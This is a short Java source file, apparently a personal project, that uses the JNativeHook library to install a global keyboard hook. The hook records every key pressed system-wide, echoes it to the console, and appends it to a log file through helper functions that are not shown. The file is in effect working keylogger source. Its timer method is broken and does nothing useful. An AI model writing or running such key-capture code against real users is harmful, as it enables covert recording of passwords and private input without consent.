package my;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*
 * 
 */
import static my.file.myTXT.createFile;
import static my.file.myTXT.writeFile;
import static my.file.myTXT.currentDateTime;

public class Main implements NativeKeyListener {

    static private List<String> myList = new ArrayList<>();

    public static void main (String[] args) throws IOException {
        
        createFile();

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Main());

        myTimer();
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {}

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        int keyCode = nativeEvent.getKeyCode();
        String keyString = nativeEvent.getKeyText(keyCode);
        System.out.println("Tecla pulsada (Código VK): " + keyCode);
        System.out.println("Letra: "+keyString);
        myList.add(keyString);
        
        try {
            writeFile(myList);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {}

    private static void myTimer () {
        boolean suspense = true;
        int minute = currentDateTime.now().getMinute();
        int plus = minute+2;
        int i = 1;
        System.out.println(currentDateTime.now().getMinute());
        while (i <= plus) {
            i++;
        }
        //System.out.println(currentDateTime.getMinute());

        //return actived;
    } 

}